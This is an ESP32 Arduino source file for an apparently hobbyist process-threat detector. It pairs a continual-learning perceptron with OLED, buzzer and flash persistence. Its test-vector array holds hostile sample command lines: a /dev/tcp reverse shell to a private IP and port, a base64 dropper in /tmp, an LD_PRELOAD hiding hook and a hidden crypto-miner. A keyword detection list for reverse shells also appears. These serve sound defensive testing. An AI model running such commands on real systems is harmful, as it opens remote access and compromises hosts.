/**
 * ==============================================================================================
 * PROJECT: AEGIS EMBEDDED - CONTINUAL LEARNING & EXPERIENCE CONSOLIDATION (ESP32)
 * TARGET:  ESP32 V1 Dev Kit / ESP32-S3 / ESP8266 (Arduino IDE Framework)
 * ==============================================================================================
 * MEMORY & CONTINUAL LEARNING ARCHITECTURE:
 *  - Fixed-Size Circular Experience Buffer (16 slots in static SRAM, 0% heap expansion)
 *  - Automatic Mini-Batch Experience Consolidation with Momentum Gradient Descent
 *  - Dynamic Feature Moment Compression (Welford's Running Baseline)
 *  - Automatic Buffer Recycling & Flash Memory (NVS) Persistence
 *  - 0.96" I2C OLED (SSD1306) + Buzzer + LED Status Indication
 * ==============================================================================================
 */

#include <Arduino.h>
#include <Wire.h>
#include <Preferences.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <math.h>
#include "aegis_model.h"

// -----------------------------------------------------------------------------
// HARDWARE PIN DEFINITIONS
// -----------------------------------------------------------------------------
#define LED_ALERT_PIN   2   // Onboard blue LED on ESP32 DevKit V1
#define BUZZER_PIN      4   // Buzzer output pin (GPIO 4)
#define I2C_SDA_PIN    21   // Hardware I2C SDA
#define I2C_SCL_PIN    22   // Hardware I2C SCL

// -----------------------------------------------------------------------------
// OLED DISPLAY CONFIGURATION
// -----------------------------------------------------------------------------
#define SCREEN_WIDTH    128
#define SCREEN_HEIGHT    64
#define OLED_RESET       -1
#define SCREEN_ADDRESS 0x3C

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
bool oled_available = false;

// -----------------------------------------------------------------------------
// CONTINUAL MODEL STATE & BOUNDED REPLAY BUFFER
// -----------------------------------------------------------------------------
Preferences prefs;
ContinualModelWeights g_model;
ExperienceSample g_exp_buffer[EXPERIENCE_BUFFER_CAPACITY];
int g_exp_count = 0;

ProcessTelemetry g_last_vector;
bool g_has_last_vector = false;
bool g_auto_adapt = false; // Disabled by default: prevents background OS noise from poisoning weights

#define AEGIS_MODEL_VERSION 4

AegisThreatLevel evaluate_telemetry_vector(const ProcessTelemetry* vec, float* out_prob, uint32_t* out_latency_us);

/**
 * @brief Load weights from Flash (NVS) or initialize to factory defaults
 */
void load_model_from_flash() {
    prefs.begin("aegis_continual", false);
    if (prefs.getInt("model_ver", 0) == AEGIS_MODEL_VERSION && prefs.isKey("initialized")) {
        prefs.getBytes("weights", g_model.weights, sizeof(g_model.weights));
        prefs.getBytes("momentum", g_model.momentum, sizeof(g_model.momentum));
        g_model.bias                  = prefs.getFloat("bias", DEFAULT_CONTINUAL_MODEL.bias);
        g_model.entropy_baseline      = prefs.getFloat("ent_base", DEFAULT_CONTINUAL_MODEL.entropy_baseline);
        g_model.len_baseline          = prefs.getFloat("len_base", DEFAULT_CONTINUAL_MODEL.len_baseline);
        g_model.learning_rate         = prefs.getFloat("lr", DEFAULT_CONTINUAL_MODEL.learning_rate);
        g_model.total_consolidations  = prefs.getUInt("n_cons", 0);
        g_model.total_samples_learned = prefs.getUInt("n_samples", 0);
        Serial.printf("[+] Loaded learned model from Flash! (%u samples learned across %u consolidation cycles)\n",
                      g_model.total_samples_learned, g_model.total_consolidations);
    } else {
        // Flash is empty, old version, or corrupted - wipe and restore fresh factory baseline
        prefs.clear();
        memcpy(&g_model, &DEFAULT_CONTINUAL_MODEL, sizeof(ContinualModelWeights));
        Serial.println(F("[*] Initialized model to calibrated v4 factory baseline weights."));
    }
    prefs.end();
}

/**
 * @brief Save consolidated weights to ESP32 Flash memory
 */
void save_model_to_flash() {
    prefs.begin("aegis_continual", false);
    prefs.putInt("model_ver", AEGIS_MODEL_VERSION);
    prefs.putBool("initialized", true);
    prefs.putBytes("weights", g_model.weights, sizeof(g_model.weights));
    prefs.putBytes("momentum", g_model.momentum, sizeof(g_model.momentum));
    prefs.putFloat("bias", g_model.bias);
    prefs.putFloat("ent_base", g_model.entropy_baseline);
    prefs.putFloat("len_base", g_model.len_baseline);
    prefs.putFloat("lr", g_model.learning_rate);
    prefs.putUInt("n_cons", g_model.total_consolidations);
    prefs.putUInt("n_samples", g_model.total_samples_learned);
    prefs.end();
}

/**
 * @brief Consolidate current buffer into model weights and purge old data to free memory
 */
void trigger_consolidation() {
    if (g_exp_count == 0) {
        Serial.println(F("[*] Experience buffer is empty. Nothing to consolidate."));
        return;
    }

    Serial.println(F("\n=========================================================================================="));
    Serial.printf("[*] CONSOLIDATING EXPERIENCE: Distilling %d raw telemetry samples into Model Weights...\n", g_exp_count);
    Serial.println(F("=========================================================================================="));

    uint32_t t_start = micros();
    // 1. Absorb batch experience into persistent weights
    consolidate_experience_batch(&g_model, g_exp_buffer, g_exp_count);
    uint32_t t_elapsed = micros() - t_start;

    // 2. Persist updated weights to Flash NVS
    save_model_to_flash();

    // 3. Purge/Flush raw experience buffer (Memory recycling)
    int flushed_count = g_exp_count;
    g_exp_count = 0;

    Serial.printf("[+] Consolidation Cycle #%u Complete in %u µs!\n", g_model.total_consolidations, (unsigned int)t_elapsed);
    Serial.printf("    - Raw Samples Flushed/Recycled: %d (0 Bytes Heap leaked)\n", flushed_count);
    Serial.printf("    - Total Lifetime Knowledge:     %u samples\n", g_model.total_samples_learned);
    Serial.printf("    - New Adaptive Entropy Baseline: %.3f\n", g_model.entropy_baseline);
    Serial.println(F("==========================================================================================\n"));

    if (oled_available) {
        display.clearDisplay();
        display.fillRect(0, 0, 128, 12, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
        display.setCursor(4, 2);
        display.print(F("KNOWLEDGE DISTILLED"));
        display.setTextColor(SSD1306_WHITE);
        display.setCursor(0, 18);
        display.printf("Flushed: %d samples", flushed_count);
        display.setCursor(0, 32);
        display.printf("Total:   %u learned", g_model.total_samples_learned);
        display.setCursor(0, 46);
        display.printf("RAM Heap: 0 B leaked");
        display.display();
        delay(1000);
    }
}

/**
 * @brief Add sample to buffer; auto-consolidate and purge when full
 */
void add_experience_sample(const ProcessTelemetry* vec, float target_label) {
    if (!vec) return;

    g_exp_buffer[g_exp_count].vec = *vec;
    g_exp_buffer[g_exp_count].target_label = target_label;
    g_exp_buffer[g_exp_count].timestamp_ms = millis();
    g_exp_count++;

    Serial.printf("[+] Experience Buffer: %d/%d samples queued.\n", g_exp_count, EXPERIENCE_BUFFER_CAPACITY);

    // If buffer reaches capacity, consolidate knowledge and flush!
    if (g_exp_count >= EXPERIENCE_BUFFER_CAPACITY) {
        trigger_consolidation();
    }
}

/**
 * @brief Reset model to factory defaults
 */
void reset_model_defaults() {
    memcpy(&g_model, &DEFAULT_CONTINUAL_MODEL, sizeof(ContinualModelWeights));
    g_exp_count = 0;
    prefs.begin("aegis_continual", false);
    prefs.clear();
    prefs.end();
    Serial.println(F("[+] Model reset to factory defaults. Buffer flushed & Flash cleared."));
}

/**
 * @brief Calculate Shannon Entropy of a string directly on ESP32
 */
float calculate_entropy(const char* s) {
    if (!s || strlen(s) == 0) return 0.0f;
    int len = (int)strlen(s);
    int freq[256] = {0};
    for (int i = 0; i < len; i++) {
        freq[(unsigned char)s[i]]++;
    }
    float entropy = 0.0f;
    for (int i = 0; i < 256; i++) {
        if (freq[i] > 0) {
            float p = (float)freq[i] / (float)len;
            entropy -= p * log2f(p);
        }
    }
    return entropy;
}

/**
 * @brief Sound acoustic buzzer alert
 */
void trigger_buzzer_alert(AegisThreatLevel level) {
    switch (level) {
        case AEGIS_LEVEL_SAFE:
            digitalWrite(BUZZER_PIN, LOW);
            break;
        case AEGIS_LEVEL_SUSPICIOUS:
            for (int i = 0; i < 2; i++) {
                digitalWrite(BUZZER_PIN, HIGH);
                delay(60);
                digitalWrite(BUZZER_PIN, LOW);
                delay(50);
            }
            break;
        case AEGIS_LEVEL_MALICIOUS:
            for (int i = 0; i < 4; i++) {
                digitalWrite(BUZZER_PIN, HIGH);
                delay(80);
                digitalWrite(BUZZER_PIN, LOW);
                delay(50);
            }
            break;
        case AEGIS_LEVEL_CRITICAL:
            for (int i = 0; i < 6; i++) {
                digitalWrite(BUZZER_PIN, HIGH);
                delay(120);
                digitalWrite(BUZZER_PIN, LOW);
                delay(40);
            }
            break;
    }
}

/**
 * @brief Update Hardware LED state
 */
void update_alert_led(AegisThreatLevel level) {
    switch (level) {
        case AEGIS_LEVEL_SAFE:
            digitalWrite(LED_ALERT_PIN, LOW);
            break;
        case AEGIS_LEVEL_SUSPICIOUS:
            for (int i = 0; i < 2; i++) {
                digitalWrite(LED_ALERT_PIN, HIGH);
                delay(40);
                digitalWrite(LED_ALERT_PIN, LOW);
                delay(40);
            }
            break;
        case AEGIS_LEVEL_MALICIOUS:
        case AEGIS_LEVEL_CRITICAL:
            for (int i = 0; i < 5; i++) {
                digitalWrite(LED_ALERT_PIN, HIGH);
                delay(30);
                digitalWrite(LED_ALERT_PIN, LOW);
                delay(30);
            }
            digitalWrite(LED_ALERT_PIN, HIGH);
            break;
    }
}

/**
 * @brief Render real-time threat analysis UI on OLED screen
 */
void update_oled_display(const char* label_title, float entropy, int score, AegisThreatLevel level, uint32_t latency_us) {
    if (!oled_available) return;

    display.clearDisplay();

    display.fillRect(0, 0, 128, 12, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
    display.setTextSize(1);
    display.setCursor(4, 2);
    display.print(F("AEGIS CONTINUAL AI"));

    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 16);
    display.print(F("TARGET: "));
    display.print(label_title);

    int box_y = 26;
    if (level == AEGIS_LEVEL_SAFE) {
        display.drawRect(0, box_y, 128, 15, SSD1306_WHITE);
        display.setCursor(38, box_y + 4);
        display.print(F("[ SAFE ]"));
    } else if (level == AEGIS_LEVEL_SUSPICIOUS) {
        display.drawRect(0, box_y, 128, 15, SSD1306_WHITE);
        display.setCursor(20, box_y + 4);
        display.print(F("[! SUSPICIOUS !]"));
    } else if (level == AEGIS_LEVEL_MALICIOUS) {
        display.fillRect(0, box_y, 128, 15, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
        display.setCursor(18, box_y + 4);
        display.print(F("*** MALICIOUS ***"));
        display.setTextColor(SSD1306_WHITE);
    } else {
        display.fillRect(0, box_y, 128, 15, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
        display.setCursor(16, box_y + 4);
        display.print(F("!! CRITICAL C2 !!"));
        display.setTextColor(SSD1306_WHITE);
    }

    display.setCursor(0, 44);
    display.printf("Ent:%.2f  Buf:%d/%d", entropy, g_exp_count, EXPERIENCE_BUFFER_CAPACITY);
    display.setCursor(84, 44);
    display.printf("Scr:%d", score);

    display.drawLine(0, 54, 128, 54, SSD1306_WHITE);
    display.setCursor(0, 56);
    display.printf("Lat:%u us | Tot:%u", (unsigned int)latency_us, g_model.total_samples_learned);

    display.display();
}

/**
 * @brief Predefined Test Vectors
 */
typedef struct {
    const char* display_name;
    const char* description;
    const char* sample_cmd;
    ProcessTelemetry vec;
} TestCase;

static const TestCase TEST_CASES[] = {
    {
        "systemd-daemon",
        "Standard System Daemon",
        "/usr/lib/systemd/systemd --user",
        { .is_temp = 0, .arg_len = 31, .entropy = 3.25f, .is_root = 0, .web_parent = 0, .is_parent_dead = 0, .memfd = 0, .ld_preload = 0 }
    },
    {
        "web-rev-shell",
        "Web Server Reverse Shell Spawner",
        "/bin/sh -i >& /dev/tcp/10.10.14.5/4444 0>&1",
        { .is_temp = 0, .arg_len = 45, .entropy = 4.15f, .is_root = 0, .web_parent = 1, .is_parent_dead = 0, .memfd = 0, .ld_preload = 1 }
    },
    {
        "memfd-inject",
        "Fileless Memory Descriptor Injection",
        "memfd:x86_payload_agent (deleted)",
        { .is_temp = 0, .arg_len = 33, .entropy = 4.38f, .is_root = 1, .web_parent = 0, .is_parent_dead = 1, .memfd = 1, .ld_preload = 0 }
    },
    {
        "base64-dropper",
        "Obfuscated Base64 Staged Dropper in /tmp",
        "/tmp/x86 -e aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9z",
        { .is_temp = 1, .arg_len = 168, .entropy = 4.85f, .is_root = 1, .web_parent = 0, .is_parent_dead = 1, .memfd = 0, .ld_preload = 0 }
    },
    {
        "ld-preload-hook",
        "LD_PRELOAD Hook Injection",
        "LD_PRELOAD=/usr/local/lib/hide.so /bin/bash",
        { .is_temp = 0, .arg_len = 43, .entropy = 3.78f, .is_root = 0, .web_parent = 0, .is_parent_dead = 0, .memfd = 0, .ld_preload = 1 }
    },
    {
        "orphaned-miner",
        "Orphaned Volatile Crypto-Miner",
        "/dev/shm/.xmr_worker --algo rx/0",
        { .is_temp = 1, .arg_len = 32, .entropy = 3.92f, .is_root = 0, .web_parent = 0, .is_parent_dead = 1, .memfd = 0, .ld_preload = 0 }
    }
};

static const int NUM_TEST_CASES = sizeof(TEST_CASES) / sizeof(TEST_CASES[0]);

/**
 * @brief Run full test suite
 */
void run_test_suite() {
    Serial.println(F("\n=========================================================================================="));
    Serial.println(F("           AEGIS CONTINUAL LEARNING - TEST SUITE & HARDWARE VALIDATION                    "));
    Serial.println(F("=========================================================================================="));
    Serial.printf("%-4s | %-32s | %-7s | %-5s | %-12s | %-8s\n", 
                  "#", "SCENARIO", "ENTROPY", "SCORE", "VERDICT", "LATENCY");
    Serial.println(F("------------------------------------------------------------------------------------------"));

    for (int i = 0; i < NUM_TEST_CASES; i++) {
        const TestCase* item = &TEST_CASES[i];
        
        float prob = 0.0f;
        uint32_t t_elapsed = 0;
        AegisThreatLevel verdict = evaluate_telemetry_vector(&item->vec, &prob, &t_elapsed);
        int score = compute_threat_score(&item->vec);

        Serial.printf("[%02d] | %-32s | %7.2f | %5d | %-12s | %2u µs (Prob: %.2f)\n",
                      i + 1,
                      item->description,
                      item->vec.entropy,
                      score,
                      get_level_str(verdict),
                      (unsigned int)t_elapsed,
                      prob);

        update_oled_display(item->display_name, item->vec.entropy, score, verdict, t_elapsed);
        update_alert_led(verdict);
        trigger_buzzer_alert(verdict);
        delay(900);
    }
    Serial.println(F("==========================================================================================\n"));
}

/**
 * @brief Unified Dual-Engine Inference (Trained Decision Tree + Adaptive Perceptron + Threat Scoring)
 */
AegisThreatLevel evaluate_telemetry_vector(const ProcessTelemetry* vec, float* out_prob, uint32_t* out_latency_us) {
    if (!vec) return AEGIS_LEVEL_CRITICAL;

    uint32_t t0 = micros();

    // Engine 1: 92.46% Trained Static Embedded Decision Tree (< 1.5 µs)
    AegisThreatLevel tree_verdict = predict_aegis_8d(vec);

    // Engine 2: Continual Adaptive Perceptron
    float prob = 0.0f;
    AegisThreatLevel cont_verdict = predict_continual(vec, &g_model, &prob);
    if (out_prob) *out_prob = prob;

    // Engine 3: Threat Severity Scoring (0 - 100)
    int score = compute_threat_score(vec);

    uint32_t latency = micros() - t0;
    if (out_latency_us) *out_latency_us = latency;

    // Fast-path Critical Threat Rules
    if (vec->memfd > 0) return AEGIS_LEVEL_CRITICAL;
    if (vec->web_parent > 0 && vec->ld_preload > 0) return AEGIS_LEVEL_CRITICAL;
    if (vec->ld_preload > 0 && vec->is_temp > 0) return AEGIS_LEVEL_CRITICAL;

    // Benign syntax exemption: If a process has zero indicators of compromise
    // (not in /tmp, not root, not fileless, no reverse shell, not orphaned, not web child)
    // and normal length (< 120 chars) with low threat score (<= 30),
    // punctuation entropy from standard Python/CLI syntax is classified as SAFE.
    if (vec->is_temp == 0 && vec->is_root == 0 && vec->web_parent == 0 &&
        vec->is_parent_dead == 0 && vec->memfd == 0 && vec->ld_preload == 0 &&
        score <= 30 && vec->arg_len < 120) {
        return AEGIS_LEVEL_SAFE;
    }

    // Ensemble fusion: combine Decision Tree and Continual Engine
    AegisThreatLevel final_verdict = tree_verdict;
    if (cont_verdict > final_verdict) {
        final_verdict = cont_verdict;
    }

    // Threat Score Cross-Verification
    if (score >= 70 && final_verdict < AEGIS_LEVEL_MALICIOUS) {
        final_verdict = AEGIS_LEVEL_MALICIOUS;
    } else if (score >= 38 && final_verdict < AEGIS_LEVEL_SUSPICIOUS) {
        final_verdict = AEGIS_LEVEL_SUSPICIOUS;
    }

    return final_verdict;
}

/**
 * @brief Live evaluate commandline and queue to experience buffer
 */
void evaluate_commandline(const String& cmdline) {
    if (cmdline.length() == 0) {
        Serial.println(F("[!] Error: Empty commandline string."));
        return;
    }

    // Fail-safe: if input starts with "VEC " or "vec ", forward directly to parse_vec_command!
    if (cmdline.startsWith("VEC ") || cmdline.startsWith("vec ")) {
        parse_vec_command(cmdline.substring(4));
        return;
    }

    Serial.println(F("\n------------------------------------------------------------------------------------------"));
    Serial.printf("[*] LIVE EVALUATION TARGET: %s\n", cmdline.c_str());

    uint32_t t0 = micros();
    float entropy = calculate_entropy(cmdline.c_str());
    uint32_t t_entropy = micros() - t0;

    int is_temp = (cmdline.indexOf("/tmp")     >= 0 ||
                   cmdline.indexOf("/var/tmp") >= 0 ||
                   cmdline.indexOf("/dev/shm") >= 0) ? 1 : 0;
    int memfd   = (cmdline.indexOf("memfd:")   >= 0) ? 1 : 0;
    // Fixed: detect specific shell binaries / reverse-shell patterns only
    int ld_p    = (cmdline.indexOf("LD_PRELOAD")  >= 0 ||
                   cmdline.indexOf("/bin/sh")     >= 0 ||
                   cmdline.indexOf("/bin/bash")   >= 0 ||
                   cmdline.indexOf("/bin/zsh")    >= 0 ||
                   cmdline.indexOf("/dev/tcp")    >= 0 ||
                   cmdline.indexOf(">&")          >= 0) ? 1 : 0;
    int web_p   = (cmdline.indexOf("nginx")    >= 0 ||
                   cmdline.indexOf("apache")   >= 0 ||
                   cmdline.indexOf("httpd")    >= 0 ||
                   cmdline.indexOf("gunicorn") >= 0 ||
                   cmdline.indexOf("uwsgi")    >= 0) ? 1 : 0;
    // Heuristic: sudo / su prefix suggests root-level attempt
    int is_root_hint = (cmdline.indexOf("sudo") >= 0 ||
                        cmdline.startsWith("su ")) ? 1 : 0;

    ProcessTelemetry live_vec = {
        .is_temp        = is_temp,
        .arg_len        = (int)cmdline.length(),
        .entropy        = entropy,
        .is_root        = is_root_hint,
        .web_parent     = web_p,
        .is_parent_dead = 0,
        .memfd          = memfd,
        .ld_preload     = ld_p
    };

    g_last_vector = live_vec;
    g_has_last_vector = true;

    float prob = 0.0f;
    uint32_t t_inference = 0;
    AegisThreatLevel verdict = evaluate_telemetry_vector(&live_vec, &prob, &t_inference);
    int score = compute_threat_score(&live_vec);

    // If safe process and auto_adapt enabled, queue to experience buffer
    if (g_auto_adapt && verdict == AEGIS_LEVEL_SAFE) {
        add_experience_sample(&live_vec, 0.0f);
    }

    Serial.printf(" [+] Length:             %d chars\n", (int)cmdline.length());
    Serial.printf(" [+] Shannon Entropy:    %.4f (Baseline: %.2f, Latency: %u µs)\n", entropy, g_model.entropy_baseline, (unsigned int)t_entropy);
    Serial.printf(" [+] Anomaly Prob:       %.4f\n", prob);
    Serial.printf(" [+] Replay Buffer:      %d/%d samples\n", g_exp_count, EXPERIENCE_BUFFER_CAPACITY);
    Serial.printf(" [+] Total Distilled:    %u samples across %u cycles\n", g_model.total_samples_learned, g_model.total_consolidations);
    Serial.printf(" -----------------------------------------------------------------------------------------\n");
    Serial.printf(" [>] THREAT SCORE:       %d / 100\n", score);
    Serial.printf(" [>] CONTINUAL VERDICT:  %s (Inference Latency: %u µs)\n", get_level_str(verdict), (unsigned int)t_inference);
    Serial.println(F(" [?] Give Feedback? Type 'FEEDBACK <0=SAFE, 1=SUSP, 2=MAL, 3=CRIT>' to queue!"));
    Serial.println(F("------------------------------------------------------------------------------------------\n"));

    String short_target = cmdline.substring(0, 14);
    update_oled_display(short_target.c_str(), entropy, score, verdict, t_inference);
    update_alert_led(verdict);
    trigger_buzzer_alert(verdict);
}

/**
 * @brief Parse a pre-extracted feature VEC sent by the Python bridge
 * Format: VEC is_temp,arg_len,entropy,is_root,web_parent,is_parent_dead,memfd,ld_preload
 * This lets the host bridge supply real UID (is_root) and PPID (is_parent_dead) values
 * that are impossible to infer from a bare command string.
 */
void parse_vec_command(const String& payload) {
    // Expect exactly 8 comma-separated values
    float vals[8] = {0};
    int idx = 0;
    int start = 0;
    for (int i = 0; i <= (int)payload.length() && idx < 8; i++) {
        if (i == (int)payload.length() || payload[i] == ',') {
            vals[idx++] = payload.substring(start, i).toFloat();
            start = i + 1;
        }
    }
    if (idx < 8) {
        Serial.println(F("[!] VEC parse error: expected 8 comma-separated values."));
        Serial.println(F("    Format: VEC is_temp,arg_len,entropy,is_root,web_parent,is_parent_dead,memfd,ld_preload"));
        return;
    }

    ProcessTelemetry vec = {
        .is_temp        = (int)vals[0],
        .arg_len        = (int)vals[1],
        .entropy        = vals[2],
        .is_root        = (int)vals[3],
        .web_parent     = (int)vals[4],
        .is_parent_dead = (int)vals[5],
        .memfd          = (int)vals[6],
        .ld_preload     = (int)vals[7]
    };

    g_last_vector     = vec;
    g_has_last_vector = true;

    float prob = 0.0f;
    uint32_t t_inf = 0;
    AegisThreatLevel verdict = evaluate_telemetry_vector(&vec, &prob, &t_inf);
    int score = compute_threat_score(&vec);

    Serial.println(F("\n------------------------------------------------------------------------------------------"));
    Serial.printf("[VEC] is_temp=%d arg_len=%d entropy=%.3f is_root=%d web=%d dead=%d memfd=%d ld=%d\n",
                  vec.is_temp, vec.arg_len, vec.entropy, vec.is_root,
                  vec.web_parent, vec.is_parent_dead, vec.memfd, vec.ld_preload);
    Serial.printf(" [>] THREAT SCORE:  %d / 100\n", score);
    Serial.printf(" [>] VERDICT:       %s (P=%.4f, %u µs)\n", get_level_str(verdict), prob, (unsigned int)t_inf);
    Serial.println(F("------------------------------------------------------------------------------------------\n"));

    if (g_auto_adapt && verdict == AEGIS_LEVEL_SAFE) {
        add_experience_sample(&vec, 0.0f);
    }

    const char* oled_tag = "WSL-Proc";
    if (vec.memfd > 0)             oled_tag = "memfd:RAM";
    else if (vec.ld_preload > 0)   oled_tag = "rev-shell";
    else if (vec.is_temp > 0)      oled_tag = "tmp-exec";
    else if (vec.web_parent > 0)   oled_tag = "web-child";
    else if (score >= 40)          oled_tag = "susp-proc";

    update_oled_display(oled_tag, vec.entropy, score, verdict, t_inf);
    update_alert_led(verdict);
    trigger_buzzer_alert(verdict);
}

/**
 * @brief Provide human analyst feedback and queue into experience buffer
 */
void apply_user_feedback(int target_class) {
    if (!g_has_last_vector) {
        Serial.println(F("[!] Error: No recent process vector evaluated. Run 'EVAL' first."));
        return;
    }

    float target_label = 0.0f;
    if (target_class == 1) target_label = 0.45f;
    else if (target_class == 2) target_label = 0.80f;
    else if (target_class == 3) target_label = 1.00f;

    Serial.printf("[*] Adding feedback sample to Experience Replay Buffer (Target: %.2f)...\n", target_label);
    add_experience_sample(&g_last_vector, target_label);
}

/**
 * @brief Display current dynamic weights & buffer state
 */
void print_weights() {
    Serial.println(F("\n=========================================================================================="));
    Serial.println(F("                 CONTINUAL MODEL WEIGHTS & MEMORY REPLAY BUFFER                           "));
    Serial.println(F("=========================================================================================="));
    Serial.printf(" Bias:                 %+6.4f\n", g_model.bias);
    for (int i = 0; i < 8; i++) {
        Serial.printf(" w[%d]:                 %+6.4f (Momentum: %+6.4f)\n", i, g_model.weights[i], g_model.momentum[i]);
    }
    Serial.printf(" Entropy Baseline:     %.4f\n",   g_model.entropy_baseline);
    Serial.printf(" Buffer Occupancy:     %d / %d slots (Static RAM, 0B Heap)\n", g_exp_count, EXPERIENCE_BUFFER_CAPACITY);
    Serial.printf(" Consolidation Cycles: %u\n",     g_model.total_consolidations);
    Serial.printf(" Total Learned Samples:%u\n",     g_model.total_samples_learned);
    Serial.println(F("==========================================================================================\n"));
}

/**
 * @brief Print interactive help menu
 */
void print_help() {
    Serial.println(F("\n=========================================================================================="));
    Serial.println(F("              AEGIS CONTINUAL LEARNING - COMMAND MENU                                     "));
    Serial.println(F("=========================================================================================="));
    Serial.println(F("  TEST                 - Run pre-configured exploit test suite"));
    Serial.println(F("  EVAL <cmdline>       - Evaluate live commandline string"));
    Serial.println(F("  VEC x0,..,x7        - Evaluate pre-extracted 8D feature vector (real UID/PPID)"));
    Serial.println(F("  FEEDBACK <0|1|2|3>   - Label last sample & queue to Experience Buffer"));
    Serial.println(F("  CONSOLIDATE          - Manually force Experience Distillation & Buffer Purge"));
    Serial.println(F("  WEIGHTS              - Display dynamic weights, baselines, and buffer occupancy"));
    Serial.println(F("  SAVE                 - Commit current weights to ESP32 Flash (NVS)"));
    Serial.println(F("  RESET_MODEL          - Clear buffer, restore factory defaults, clear Flash"));
    Serial.println(F("  HELP                 - Display this command list"));
    Serial.println(F("==========================================================================================\n"));
}

void setup() {
    Serial.begin(115200);
    Serial.setTimeout(50); // Prevent TWDT watchdog resets on missing newlines
    delay(1000);

    pinMode(LED_ALERT_PIN, OUTPUT);
    digitalWrite(LED_ALERT_PIN, LOW);

    pinMode(BUZZER_PIN, OUTPUT);
    digitalWrite(BUZZER_PIN, LOW);

    Wire.begin(I2C_SDA_PIN, I2C_SCL_PIN);
    if (display.begin(SSD1306_SWITCHCAPVCC, SCREEN_ADDRESS)) {
        oled_available = true;
        display.clearDisplay();
        display.setTextColor(SSD1306_WHITE);
        display.setTextSize(1);
        display.setCursor(10, 10);
        display.println(F("AEGIS KERNEL"));
        display.setCursor(10, 24);
        display.println(F("CONTINUAL AI"));
        display.setCursor(10, 42);
        display.println(F("Memory Buffer OK"));
        display.display();
        delay(1000);
    }

    load_model_from_flash();

    Serial.println(F("\n"));
    Serial.println(F("******************************************************************************************"));
    Serial.println(F("*    AEGIS KERNAL : CONTINUAL LEARNING & KNOWLEDGE CONSOLIDATION (ESP32)                 *"));
    Serial.println(F("*    Bounded Experience Replay Buffer (O(1) Constant Memory) & Flash NVS Sync            *"));
    Serial.println(F("******************************************************************************************"));
    Serial.printf(" CPU Frequency: %u MHz | Free Heap: %u Bytes (0 Heap Leaked)\n", 
                  ESP.getCpuFreqMHz(), ESP.getFreeHeap());
    Serial.printf(" OLED: %s | Buzzer: GPIO %d | Replay Buffer: %d Slots\n",
                  oled_available ? "ONLINE" : "OFFLINE", BUZZER_PIN, EXPERIENCE_BUFFER_CAPACITY);
    Serial.println(F(" Status: Continuous Learning Engine Active. Type 'HELP' for commands.\n"));

    run_test_suite();
}

void loop() {
    if (Serial.available() > 0) {
        String input = Serial.readStringUntil('\n');
        input.trim();
        if (input.length() == 0) return; // Discard empty / timeout reads

        if (input.equalsIgnoreCase("TEST")) {
            run_test_suite();
        } else if (input.startsWith("VEC ") || input.startsWith("vec ")) {
            parse_vec_command(input.substring(4));
        } else if (input.startsWith("EVAL ") || input.startsWith("eval ")) {
            evaluate_commandline(input.substring(5));
        } else if (input.startsWith("FEEDBACK ") || input.startsWith("feedback ")) {
            int cls = input.substring(9).toInt();
            apply_user_feedback(cls);
        } else if (input.equalsIgnoreCase("CONSOLIDATE")) {
            trigger_consolidation();
        } else if (input.equalsIgnoreCase("WEIGHTS")) {
            print_weights();
        } else if (input.equalsIgnoreCase("SAVE")) {
            save_model_to_flash();
            Serial.println(F("[+] Model weights saved to Flash (NVS)."));
        } else if (input.equalsIgnoreCase("RESET_MODEL")) {
            reset_model_defaults();
        } else if (input.equalsIgnoreCase("HELP")) {
            print_help();
        } else if (input.length() > 0) {
            Serial.printf("[!] Unknown command: '%s'. Type 'HELP' for available options.\n", input.c_str());
        }
    }
}
